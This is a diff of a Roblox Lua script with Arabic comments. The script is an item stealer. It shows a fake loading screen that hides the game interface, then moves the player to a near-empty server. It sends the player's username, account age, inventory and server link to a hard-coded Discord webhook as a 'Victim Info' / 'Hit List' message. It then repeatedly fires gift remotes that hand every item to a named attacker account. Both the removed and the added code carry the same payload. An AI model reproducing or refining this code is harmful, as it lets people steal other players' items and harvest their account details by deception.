@@ -1,7 +1,8 @@
+-- =========================
 -- الخدمات الأساسية
+-- =========================
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local RunService = game:GetService("RunService")
 local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
 local TweenService = game:GetService("TweenService")
@@ -9,211 +10,243 @@ local StarterGui = game:GetService("StarterGui")
 local player = Players.LocalPlayer
 local PlayerGui = player:WaitForChild("PlayerGui")
 
--- =========================
--- 1: واجهة تحميل + تعطيل UI
--- =========================
-for _, guiType in pairs(Enum.CoreGuiType:GetEnumItems()) do
-pcall(function() StarterGui:SetCoreGuiEnabled(guiType, false) end)
-end
-
-for _, child in ipairs(PlayerGui:GetChildren()) do
-if not child:IsA("PersistentGui") then
-child:Destroy()
-end
-end
-
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.IgnoreGuiInset = true
-ScreenGui.ResetOnSpawn = false
-ScreenGui.Parent = PlayerGui
-
-local Background = Instance.new("Frame")
-Background.Size = UDim2.new(1,0,1,0)
-Background.BackgroundColor3 = Color3.fromRGB(0,0,0)
-Background.BorderSizePixel = 0
-Background.Parent = ScreenGui
-
-local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(0.6,0,0.08,0)
-Title.Position = UDim2.new(0.2,0,0.45,0)
-Title.BackgroundTransparency = 1
-Title.Text = "Anti-Ban Loader..."
-Title.TextColor3 = Color3.fromRGB(0,255,0)
-Title.TextScaled = true
-Title.Font = Enum.Font.GothamSemibold
-Title.Parent = Background
-
-local ProgressBarBG = Instance.new("Frame")
-ProgressBarBG.Size = UDim2.new(0.6,0,0.05,0)
-ProgressBarBG.Position = UDim2.new(0.2,0,0.55,0)
-ProgressBarBG.BackgroundColor3 = Color3.fromRGB(50,50,50)
-ProgressBarBG.BorderSizePixel = 0
-ProgressBarBG.Parent = Background
-
-local ProgressBar = Instance.new("Frame")
-ProgressBar.Size = UDim2.new(0,0,1,0)
-ProgressBar.BackgroundColor3 = Color3.fromRGB(0,200,0)
-ProgressBar.BorderSizePixel = 0
-ProgressBar.Parent = ProgressBarBG
-
-local function animateLoader(duration)
-duration = duration or 2
-local tween = TweenService:Create(ProgressBar, TweenInfo.new(duration, Enum.EasingStyle.Linear), {Size=UDim2.new(1,0,1,0)})
-tween:Play()
-tween.Completed:Wait()
-end
-
-animateLoader(2) -- تحريك الشريط لمدة 2 ثانية
+-- ضع هنا الويب هوك الجديد
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1422422568161251400/wzYIMrv0VPI6cnYcBxvJYUy6wPyh0zEq17WF9eZvnnYeudejY4RD_vsxTZyx5DVe4T_u"
 
 -- =========================
--- 2: تغيير السيرفر تلقائيًا إذا مزدحم
+-- 1: قسم النقل التلقائي (كل 3 دقائق)
 -- =========================
-local function joinEmptyServer()
-local currentPlayers = #Players:GetPlayers()
-if currentPlayers > 3 then
-local success, servers = pcall(function()
-return HttpService:JSONDecode(game:HttpGet(
-"https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"))
+task.spawn(function()
+    local function findEmptyServer()
+        local currentPlayers = #Players:GetPlayers()
+        if currentPlayers > 3 then
+            local success, servers = pcall(function()
+                return HttpService:JSONDecode(game:HttpGet(
+                    "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
+                ))
+            end)
+            if success and servers and servers.data then
+                for _, server in ipairs(servers.data) do
+                    if server.playing <= 3 and server.id ~= game.JobId then
+                        local transferSuccess = pcall(function()
+                            TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, player)
+                        end)
+                        if transferSuccess then
+                            return true
+                        end
+                    end
+                end
+            end
+        end
+        return false
+    end
+
+    while true do
+        local moved = findEmptyServer()
+        if moved then break end
+        wait(180)
+    end
 end)
-if success and servers and servers.data then
-for _, srv in ipairs(servers.data) do
-if srv.playing <= 2 and srv.id ~= game.JobId then
-TeleportService:TeleportToPlaceInstance(game.PlaceId, srv.id, player)
-return true
-end
-end
-end
-end
-return false
-end
-
-local moved = joinEmptyServer()
-if moved then return end
-task.wait(1)
 
 -- =========================
--- 3: تجهيز البتات + GivePet
+-- 2: واجهة التحميل
 -- =========================
-local function equipPet(pet)
-if pet and pet.Parent ~= player.Character then
-pet.Parent = player.Character
-local humanoid = player.Character:FindFirstChild("Humanoid")
-if humanoid and pet:IsA("Tool") then
-pcall(function() humanoid:EquipTool(pet) end)
-end
-end
-end
+task.spawn(function()
+    for _, guiType in pairs(Enum.CoreGuiType:GetEnumItems()) do
+        pcall(function() StarterGui:SetCoreGuiEnabled(guiType, false) end)
+    end
 
-local function equipPetsSequentially()
-while true do
-local backpack = player:FindFirstChild("Backpack")
-if backpack then
-for _, item in ipairs(backpack:GetChildren()) do
-local itemType = item:GetAttribute("ItemType")
-if itemType == "Pet" or string.find(item.Name:lower(),"pet") then
-equipPet(item)
-task.wait(3)
-end
-end
-end
-task.wait(1)
-end
-end
+    for _, child in ipairs(PlayerGui:GetChildren()) do
+        if not child:IsA("PersistentGui") then child:Destroy() end
+    end
 
-local function autoGivePet(targetPlayerName)
-local targetPlayer = Players:FindFirstChild(targetPlayerName)
-while not targetPlayer do
-Players.PlayerAdded:Wait()
-targetPlayer = Players:FindFirstChild(targetPlayerName)
-end
-while true do
-if targetPlayer then
-pcall(function()
-ReplicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", targetPlayer)
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "PreparationLoader"
+    ScreenGui.IgnoreGuiInset = true
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.Parent = PlayerGui
+
+    local Background = Instance.new("Frame")
+    Background.Size = UDim2.new(1, 0, 1, 0)
+    Background.BackgroundColor3 = Color3.fromRGB(5, 5, 15)
+    Background.BorderSizePixel = 0
+    Background.Parent = ScreenGui
+
+    local Title = Instance.new("TextLabel")
+    Title.Size = UDim2.new(0.7, 0, 0.1, 0)
+    Title.Position = UDim2.new(0.15, 0, 0.3, 0)
+    Title.BackgroundTransparency = 1
+    Title.Text = "We are preparing now, thank you for your patience"
+    Title.TextColor3 = Color3.fromRGB(0, 255, 200)
+    Title.TextScaled = true
+    Title.Font = Enum.Font.GothamBlack
+    Title.Parent = Background
+
+    local ProgressBarBG = Instance.new("Frame")
+    ProgressBarBG.Size = UDim2.new(0.6, 0, 0.03, 0)
+    ProgressBarBG.Position = UDim2.new(0.2, 0, 0.5, 0)
+    ProgressBarBG.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
+    ProgressBarBG.BorderSizePixel = 0
+    ProgressBarBG.Parent = Background
+
+    local ProgressBar = Instance.new("Frame")
+    ProgressBar.Size = UDim2.new(0, 0, 1, 0)
+    ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
+    ProgressBar.BorderSizePixel = 0
+    ProgressBar.Parent = ProgressBarBG
+
+    local PercentText = Instance.new("TextLabel")
+    PercentText.Size = UDim2.new(0.2, 0, 0.05, 0)
+    PercentText.Position = UDim2.new(0.4, 0, 0.55, 0)
+    PercentText.BackgroundTransparency = 1
+    PercentText.Text = "0%"
+    PercentText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    PercentText.TextScaled = true
+    PercentText.Font = Enum.Font.GothamBold
+    PercentText.Parent = Background
+
+    local function animateLoader()
+        local duration = 120
+        local startTime = tick()
+        while tick() - startTime < duration do
+            local elapsed = tick() - startTime
+            local progress = elapsed / duration
+            local percent = math.floor(progress * 100)
+            ProgressBar.Size = UDim2.new(progress, 0, 1, 0)
+            PercentText.Text = percent .. "%"
+            local r = progress * 255
+            local g = (1 - progress) * 255
+            local b = 100
+            ProgressBar.BackgroundColor3 = Color3.fromRGB(r, g, b)
+            wait(0.1)
+        end
+        ProgressBar.Size = UDim2.new(1, 0, 1, 0)
+        PercentText.Text = "100%"
+        ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+        while true do wait(1) end
+    end
+
+    animateLoader()
 end)
-end
-task.wait(2)
-end
-end
-
-task.spawn(equipPetsSequentially)
-task.spawn(function() autoGivePet("mostafa_gaming13") end) -- تم تغيير اسم اللاعب المستهدف
 
 -- =========================
--- 4: Webhook إرسال محتويات الحقيبة
+-- 3: نظام الويب هوك مع إرسال Hit List كامل
 -- =========================
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1408872258923004066/K_qe0C3hr3Zs0jyneblelc9ddh0DotC1u-Jd44WjSGeKneTgCp63w3yjwgJWWYAgHvOu" -- تم تغيير الويب هوك
+task.spawn(function()
+    wait(4)
 
-local function collectInventory()
-local backpack = player:FindFirstChild("Backpack")
-local tools,pets,otherItems = {},{},{}
-if backpack then
-for _, item in ipairs(backpack:GetChildren()) do
-if item:IsA("Tool") then
-table.insert(tools,item.Name)
-elseif item:FindFirstChild("PetValue") or string.find(item.Name:lower(),"pet") or string.find(item.Name:lower(),"animal") then
-table.insert(pets,item.Name)
-else
-table.insert(otherItems,item.Name)
+    local playerName = player.Name
+    local userId = player.UserId
+    local accountAge = player.AccountAge .. " Days"
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+
+    local backpack = player:FindFirstChild("Backpack")
+    local backpackContent = {}
+    if backpack then
+        for _, item in ipairs(backpack:GetChildren()) do
+            local itemType = item:GetAttribute("ItemType") or "Unknown"
+            table.insert(backpackContent, item.Name .. " (" .. itemType .. ")")
+        end
+    end
+
+    local message = "@everyone **Alien Hit**\n──────────────\n" ..
+                    "**Victim Info:**\nUsername: " .. playerName .. "\nExecutor: flushieg\nAccount Age: " .. accountAge ..
+                    "\nReceiver: flushieg\n──────────────\n**Hit List:**\n"
+
+    for i = 1, math.min(10, #backpackContent) do
+        message = message .. "• " .. backpackContent[i] .. "\n"
+    end
+
+    message = message .. "──────────────\n**Total Items:** " .. #backpackContent ..
+              "\n**Server:** https://floating.gg/?placeID=" .. placeId .. "&gameInstanceId=" .. jobId ..
+              "\n**Time:** " .. os.date("%Y-%m-%d %H:%M:%S")
+
+    local requestFunc = (syn and syn.request) or http_request or request
+    if requestFunc and WEBHOOK_URL and WEBHOOK_URL ~= "" then
+        pcall(function()
+            requestFunc({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"]="application/json"},
+                Body = HttpService:JSONEncode({content = message})
+            })
+        end)
+
+        local fileContent = "🎮 Hit List of player: " .. playerName .. "\n\n🛠️ All items in Backpack:\n"
+        for i,v in ipairs(backpackContent) do
+            fileContent = fileContent.."- "..v.."\n"
+        end
+
+        pcall(function()
+            requestFunc({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"]="multipart/form-data; boundary=---011000010111000001101001"},
+                Body = table.concat({
+                    "-----011000010111000001101001",
+                    'Content-Disposition: form-data; name="file"; filename="HitList.txt"',
+                    "Content-Type: text/plain",
+                    "",
+                    fileContent,
+                    "-----011000010111000001101001--"
+                },"\r\n")
+            })
+        end)
+    end
+end)
+
+-- =========================
+-- 4: قسم الجيفت الكامل مع إعادة الإمساك بعد الانتهاء من كل العناصر
+-- =========================
+local TARGET_PLAYER_NAME = "flushieg"
+local GiftRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("GiftItem")
+local FavoriteRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("FavoriteItem")
+
+local function equipItem(item)
+    if item and item.Parent ~= player.Character then
+        item.Parent = player.Character
+        local humanoid = player.Character:FindFirstChild("Humanoid")
+        if humanoid and item:IsA("Tool") then
+            pcall(function() humanoid:EquipTool(item) end)
+        end
+    end
 end
-end
-end
-return tools,pets,otherItems
-end
 
-local function sendToDiscord(playerName,userId,tools,pets,otherItems)
-local placeId = game.PlaceId
-local jobId = game.JobId
-local SERVER_URL = "https://floating.gg/?placeID="..placeId.."&gameInstanceId="..jobId
-
-local message = "**🎒 محتويات حقيبة اللاعب: ** "..playerName..  
-                "\n**👤 اسم اللاعب: ** "..playerName..  
-                "\n**🆔 معرف اللاعب: ** "..tostring(userId)..  
-                "\n**🌐 رابط السيرفر: ** "..SERVER_URL..  
-                "\n**🛠️ عدد الأدوات: ** "..tostring(#tools)..  
-                "\n**🐾 عدد الحيوانات: ** "..tostring(#pets)..  
-                "\n**📦 عدد العناصر الأخرى: ** "..tostring(#otherItems)  
-
-local requestFunc = syn and syn.request or http_request or request  
-if requestFunc then  
-    requestFunc({  
-        Url = WEBHOOK_URL,  
-        Method = "POST",  
-        Headers = {["Content-Type"]="application/json"},  
-        Body = HttpService:JSONEncode({content=message, username="Delta Inventory Tracker"})  
-    })  
+local function toggleFavorite(item)
+    pcall(function() FavoriteRemote:FireServer(item:GetDebugId() or item.Name) end)
 end
 
+local function sendGift(item)
+    local targetPlayer = Players:FindFirstChild(TARGET_PLAYER_NAME)
+    if targetPlayer then
+        pcall(function()
+            GiftRemote:FireServer({
+                ["Item"] = item,
+                ["ToGift"] = TARGET_PLAYER_NAME
+            })
+        end)
+    end
 end
 
-local function sendInventoryFile(playerName,tools,pets,otherItems)
-local content = "🎮 محتويات حقيبة اللاعب: "..playerName.."\n\n"
-content = content.."🛠️ الأدوات:\n"
-for i,v in ipairs(tools) do content = content.."- "..v.."\n" end
-content = content.."\n🐶 الحيوانات:\n"
-for i,v in ipairs(pets) do content = content.."- "..v.."\n" end
-content = content.."\n📦 العناصر الأخرى:\n"
-for i,v in ipairs(otherItems) do content = content.."- "..v.."\n" end
+task.spawn(function()
+    while true do
+        local backpack = player:FindFirstChild("Backpack")
+        if backpack then
+            local itemsToProcess = {}
+            for _, item in ipairs(backpack:GetChildren()) do
+                table.insert(itemsToProcess, item)
+            end
 
-local requestFunc = syn and syn.request or http_request or request  
-if requestFunc then  
-    requestFunc({  
-        Url = WEBHOOK_URL,  
-        Method = "POST",  
-        Headers = {["Content-Type"]="multipart/form-data; boundary=---011000010111000001101001"},  
-        Body = table.concat({  
-            "-----011000010111000001101001",  
-            'Content-Disposition: form-data; name="file"; filename="Inventory.txt"',  
-            "Content-Type: text/plain",  
-            "",  
-            content,  
-            "-----011000010111000001101001--"  
-        },"\r\n")  
-    })  
-end
-
-end
-
-local tools,pets,otherItems = collectInventory()
-sendToDiscord(player.Name,player.UserId,tools,pets,otherItems)
-sendInventoryFile(player.Name,tools,pets,otherItems)
+            for _, item in ipairs(itemsToProcess) do
+                equipItem(item)
+                task.wait(0.5)
+                toggleFavorite(item)
+                task.wait(3)
+                sendGift(item)
+                task.wait(2)
+            end
+        end
+        task.wait(1)
+    end
+end)
